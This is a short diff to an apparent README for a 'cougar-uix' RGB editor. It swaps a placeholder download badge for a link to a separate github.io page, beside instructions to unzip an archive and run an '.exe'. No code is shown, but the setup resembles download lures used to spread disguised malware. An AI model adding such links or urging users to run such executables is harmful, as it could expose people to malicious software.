@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://cougar-uix-system.github.io/.github/)
 
 ## 📸 Overview
 ![cougar-uix-rgb-editor](https://github.com/user-attachments/assets/0da8dced-1287-44a6-bae4-87325ee6fb15)
